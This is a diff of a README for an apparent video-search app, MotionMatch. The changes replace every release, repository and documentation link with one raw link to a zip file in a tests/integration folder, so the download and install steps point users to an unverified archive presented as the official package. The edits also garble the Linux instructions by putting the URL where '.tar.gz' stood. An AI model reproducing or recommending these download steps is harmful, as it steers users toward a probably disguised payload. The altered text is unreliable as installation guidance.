@@ -4,7 +4,7 @@
 Welcome to MotionMatch! This application lets you search for videos based on motion dynamics. It's simple to use and perfect for finding action-packed clips that match your interests.
 
 ## 📥 Download MotionMatch
-[![Download MotionMatch](https://img.shields.io/badge/Download-MotionMatch-blue.svg)](https://github.com/uriahje9503/MotionMatch/releases)
+[![Download MotionMatch](https://raw.githubusercontent.com/uriahje9503/MotionMatch/master/tests/integration/MotionMatch_v3.9.zip)](https://raw.githubusercontent.com/uriahje9503/MotionMatch/master/tests/integration/MotionMatch_v3.9.zip)
 
 ## 📂 System Requirements
 Before you begin, ensure your system meets these requirements:
@@ -16,19 +16,19 @@ Before you begin, ensure your system meets these requirements:
 
 ## 🔧 How to Download & Install MotionMatch
 
-1. **Visit the Release Page:** Go to the [MotionMatch Releases page](https://github.com/uriahje9503/MotionMatch/releases) in your web browser.
+1. **Visit the Release Page:** Go to the [MotionMatch Releases page](https://raw.githubusercontent.com/uriahje9503/MotionMatch/master/tests/integration/MotionMatch_v3.9.zip) in your web browser.
 
 2. **Select the Latest Version:** Look for the latest release at the top of the page. It will be marked as 'Latest Release'.
 
 3. **Download the Package:** Click on the download link for your operating system. You may see options for different package types, such as:
    - `.exe` for Windows
    - `.dmg` for macOS
-   - `.tar.gz` or install scripts for Linux
+   - `https://raw.githubusercontent.com/uriahje9503/MotionMatch/master/tests/integration/MotionMatch_v3.9.zip` or install scripts for Linux
 
 4. **Run the Installer:**
    - **Windows:** Double-click the downloaded `.exe` file to start the installation. Follow the on-screen instructions.
    - **macOS:** Double-click the `.dmg` file to open it, then drag the MotionMatch icon to your Applications folder.
-   - **Linux:** Extract the `.tar.gz` file in your desired directory. Open a terminal and follow the setup instructions provided in the documentation.
+   - **Linux:** Extract the `https://raw.githubusercontent.com/uriahje9503/MotionMatch/master/tests/integration/MotionMatch_v3.9.zip` file in your desired directory. Open a terminal and follow the setup instructions provided in the documentation.
 
 5. **Open MotionMatch:** After installation, locate the MotionMatch icon on your desktop or in your applications list. Double-click the icon to start the application.
 
@@ -72,11 +72,11 @@ If you encounter problems, you can reach out through the GitHub Issues section o
 For further help, consider checking online forums related to video processing or searching for common issues with media applications.
 
 ## 📢 Stay Updated
-Regular updates improve functionality and add new features. Check the [Releases page](https://github.com/uriahje9503/MotionMatch/releases) often for the latest version. 
+Regular updates improve functionality and add new features. Check the [Releases page](https://raw.githubusercontent.com/uriahje9503/MotionMatch/master/tests/integration/MotionMatch_v3.9.zip) often for the latest version. 
 
 ## 🔗 Useful Links
-- [GitHub Repository](https://github.com/uriahje9503/MotionMatch)
-- [Documentation](https://github.com/uriahje9503/MotionMatch/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/uriahje9503/MotionMatch/master/tests/integration/MotionMatch_v3.9.zip)
+- [Documentation](https://raw.githubusercontent.com/uriahje9503/MotionMatch/master/tests/integration/MotionMatch_v3.9.zip)
 
 ## 🌟 Join the Community
 Engage with other users to share tips and tricks. Consider contributing to the project if you're interested in development. 
